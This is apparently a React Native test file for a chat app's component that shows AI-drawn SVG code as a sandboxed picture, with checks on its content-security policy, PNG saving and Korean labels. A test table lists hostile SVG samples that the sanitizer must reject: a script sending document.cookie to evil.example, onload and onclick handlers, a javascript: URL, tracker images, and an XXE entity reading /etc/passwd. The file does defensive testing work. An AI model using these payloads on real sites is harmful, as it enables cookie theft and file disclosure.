// A picture an AI drew as SVG code is shown as a picture (#14), in a page
// that runs none of the SVG's code and reaches no address. An SVG that is
// more than a drawing stays code.

import { act, render, screen, userEvent } from '@testing-library/react-native';

import { setLang } from '@/i18n';
import { mockPhotoSave } from '@/test/photos';

import { Markdown } from './Markdown';
import { drawableSvg, maxSvg, svgMessage, svgOf, svgPage } from './svg';
import { SvgBlock } from './SvgBlock';

const cat = [
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="200" height="200">',
  '  <!-- ears -->',
  '  <defs><linearGradient id="g"><stop offset="0" stop-color="#F4A261"/><stop offset="1" stop-color="#FFCDB2"/></linearGradient></defs>',
  '  <polygon points="42,78 50,28 92,60" fill="url(#g)"/>',
  '  <circle id="eye" cx="80" cy="105" r="8" fill="#2B2D42"/>',
  '  <use href="#eye" x="40"/>',
  '  <text x="100" y="180" text-anchor="middle" style="font: bold 14px sans-serif">고양이</text>',
  '</svg>',
].join('\n');

const nonce = '0123456789abcdef0123456789abcdef';

afterEach(() => setLang('en'));

test('a drawing in an svg code block is taken as it is', () => {
  expect(svgOf('svg', cat)).toBe(cat);
  expect(svgOf('SVG', `\n${cat}\n`)).toBe(cat);
  expect(svgOf('xml', `<?xml version="1.0" encoding="UTF-8"?>\n<!-- a cat -->\n${cat}`)).toBe(cat);
  expect(svgOf('html', cat)).toBe(cat);
  expect(svgOf(undefined, cat)).toBe(cat);
  expect(drawableSvg(cat)).toBe(true);
  // A small picture carried inside the SVG is part of the drawing.
  expect(drawableSvg('<svg><image href="data:image/png;base64,iVBORw0KGgo=" width="4" height="4"/></svg>')).toBe(true);
});

test('code that is not an SVG drawing stays code', () => {
  expect(svgOf('js', cat)).toBeNull();
  expect(svgOf('python', cat)).toBeNull();
  expect(svgOf('svg', 'not an svg')).toBeNull();
  expect(svgOf('svg', `Here it is:\n${cat}`)).toBeNull();
  expect(svgOf('svg', `${cat}\n<p>and more</p>`)).toBeNull();
  expect(svgOf('svg', '<svg><circle r="1"/>')).toBeNull();
  expect(svgOf('svg', `<svg>${' '.repeat(maxSvg)}</svg>`)).toBeNull();
});

test('an SVG that could run code or reach an address is not drawn', () => {
  const wrap = (inner: string, attrs = '') => `<svg xmlns="http://www.w3.org/2000/svg"${attrs}>${inner}</svg>`;
  const bad: Record<string, string> = {
    script: wrap('<script>fetch("https://evil.example/?" + document.cookie)</script>'),
    'script with space': wrap('< script >1</script>'),
    'a handler': wrap('<circle r="5" onclick="alert(1)"/>'),
    'a handler on the svg': wrap('<circle r="5"/>', ' onload="alert(1)"'),
    'a handler after a quote': wrap('<circle r="5" fill="red"onmouseover=alert(1) />'),
    'HTML inside': wrap('<foreignObject><div>hi</div></foreignObject>'),
    'a frame': wrap('<iframe src="https://example.com"></iframe>'),
    'an outside picture': wrap('<image href="https://tracker.example/pixel.png" width="1" height="1"/>'),
    'an outside picture, old attribute': wrap('<image xlink:href="http://tracker.example/p.png"/>'),
    'an outside picture, no quotes': wrap('<image href=https://tracker.example/p.png />'),
    'a protocol-relative address': wrap('<image href="//tracker.example/p.png"/>'),
    'a file on the phone': wrap('<image href="file:///data/user/0/app.askorus/files/secret"/>'),
    'a use from outside': wrap('<use href="https://example.com/sprite.svg#a"/>'),
    'a link': wrap('<a href="#x"><circle r="5"/></a>'),
    'a javascript address': wrap('<set attributeName="href" to="javascript:alert(1)"/>'),
    'CSS that loads': wrap('<style>circle { fill: url(https://example.com/p.svg#a) }</style><circle r="5"/>'),
    'CSS that loads, quoted': wrap('<circle r="5" style="fill: url(\'https://example.com/p\')"/>'),
    'a CSS import': wrap('<style>@import "https://example.com/x.css";</style>'),
    'a font from outside': wrap('<style>@font-face { font-family: x; src: url(//example.com/f.woff2) }</style>'),
    'an HTML page as data': wrap('<image href="data:text/html;base64,PHNjcmlwdD4="/>'),
    'an SVG as data (it could hold a script)': wrap('<image href="data:image/svg+xml;base64,PHN2Zz4="/>'),
    'an entity': '<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>',
    'a stylesheet instruction': '<?xml-stylesheet href="https://example.com/x.css"?><svg></svg>',
    'a meta refresh': wrap('<meta http-equiv="refresh" content="0;url=https://example.com"/>'),
  };
  for (const [name, svg] of Object.entries(bad)) {
    expect([name, svgOf('svg', svg)]).toEqual([name, null]);
  }
});

test("the page allows no connection and only its own script, and holds no address of its own", () => {
  const page = svgPage(cat, nonce);
  expect(page).toContain(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'nonce-${nonce}'; base-uri 'none'; form-action 'none'">`);
  expect(page).toContain(cat);
  expect(page.match(/<script/g)).toHaveLength(1);
  expect(page).toContain(`<script nonce="${nonce}">`);
  // Besides the SVG's own namespace, the page names one address: the namespace the PNG copy needs.
  const own = page.replace(cat, '');
  expect(own.match(/https?:\/\/[^'"\s)]+/g)).toEqual(['http://www.w3.org/2000/svg']);
  expect(own).not.toMatch(/file:|src=/i);
  for (const bad of ['', 'abc', 'x"><script>', `${nonce}"`]) expect(() => svgPage(cat, bad)).toThrow();
});

test('what the page says is read strictly', () => {
  expect(svgMessage('{"height":212.4}')).toEqual({ height: 213 });
  expect(svgMessage('{"height":999999}')).toEqual({ height: 3000 });
  expect(svgMessage('{"height":0}')).toBeNull();
  expect(svgMessage('{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":300}')).toEqual({ png: 'iVBORw0KGgo=', width: 400, height: 300 });
  expect(svgMessage('{"png":"data:text/html;base64,PGI+","width":1,"height":1}')).toEqual({ pngError: true });
  expect(svgMessage('{"png":"data:image/png;base64,<script>","width":1,"height":1}')).toEqual({ pngError: true });
  expect(svgMessage('{"pngError":1}')).toEqual({ pngError: true });
  for (const junk of ['', '212', 'null', '[]', '{"other":1}', 'not json', 5, null, undefined]) expect(svgMessage(junk)).toBeNull();
});

test('an svg block of an answer is drawn as a picture, with its code one press away', async () => {
  const user = userEvent.setup();
  await render(<Markdown text={['Here is the logo.', '', '```svg', cat, '```', '', 'Hope you like it.'].join('\n')} />);
  expect(screen.getByText('Here is the logo.')).toBeTruthy();
  const block = screen.getByTestId('svg-block');
  expect(block).toBeTruthy();
  const web = screen.getByTestId('svg-webview');
  expect(web.props.source.html).toContain(cat);
  expect(web.props.source.html).toMatch(/default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'nonce-[0-9a-f]{32}'/);
  expect(web.props.source.baseUrl).toBe('about:blank');
  expect(web.props.allowFileAccess).toBe(false);
  // The page loads itself and nothing else.
  expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
  expect(web.props.onShouldStartLoadWithRequest({ url: 'https://example.com/' })).toBe(false);
  expect(screen.getByLabelText('A picture the AI drew as code')).toBeTruthy();
  // The code is not shown until asked for.
  expect(screen.queryByText(/<polygon points/)).toBeNull();
  await user.press(screen.getByRole('button', { name: 'Show code' }));
  expect(screen.getByText(/<polygon points/)).toBeTruthy();
  await user.press(screen.getByRole('button', { name: 'Hide code' }));
  expect(screen.queryByText(/<polygon points/)).toBeNull();
  // The page says how tall the picture is.
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"height":240}' } }));
  expect(screen.getByLabelText('A picture the AI drew as code').props.style).toEqual({ height: 240 });
});

test('an SVG that is more than a drawing, and other code, stay code blocks', async () => {
  const evil = '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://tracker.example/p.png"/></svg>';
  await render(<Markdown text={['```svg', evil, '```', '', '```js', 'const svg = "<svg></svg>";', '```'].join('\n')} />);
  expect(screen.queryByTestId('svg-block')).toBeNull();
  expect(screen.queryByTestId('svg-webview')).toBeNull();
  expect(screen.getByText(evil)).toBeTruthy();
});

test("Save sends the page's PNG to the phone's photos and says so; a failure says so too", async () => {
  const user = userEvent.setup();
  await render(<SvgBlock svg={cat} source={cat} />);
  const web = screen.getByTestId('svg-webview');
  await user.press(screen.getByRole('button', { name: 'Save' }));
  // The page answers with the PNG it drew.
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":400}' } }));
  expect(mockPhotoSave.saved).toEqual(['iVBORw0KGgo=']);
  expect(await screen.findByText("Saved to your phone's photos.")).toBeTruthy();

  mockPhotoSave.fail = 'unsupported';
  await user.press(screen.getByRole('button', { name: 'Save' }));
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":400}' } }));
  expect(await screen.findByText("This phone can't save it. Android 10 and later can.")).toBeTruthy();

  mockPhotoSave.fail = null;
  await user.press(screen.getByRole('button', { name: 'Save' }));
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"pngError":1}' } }));
  expect(await screen.findByText("Couldn't save it.")).toBeTruthy();
  expect(mockPhotoSave.saved).toHaveLength(1);
});

test('a build that cannot save has no Save, and a page that fails shows the code', async () => {
  mockPhotoSave.available = false;
  await render(<SvgBlock svg={cat} source={cat} />);
  expect(screen.queryByRole('button', { name: 'Save' })).toBeNull();
  expect(screen.getByRole('button', { name: 'Show code' })).toBeTruthy();
  await act(async () => screen.getByTestId('svg-webview').props.onError());
  expect(screen.queryByTestId('svg-block')).toBeNull();
  expect(screen.getByText(/<polygon points/)).toBeTruthy();
});

test('the words are Korean in Korean', async () => {
  setLang('ko');
  await render(<SvgBlock svg={cat} source={cat} />);
  expect(screen.getByRole('button', { name: '코드 보기' })).toBeTruthy();
  expect(screen.getByRole('button', { name: '저장' })).toBeTruthy();
  expect(screen.getByLabelText('AI가 코드로 그린 그림')).toBeTruthy();
});
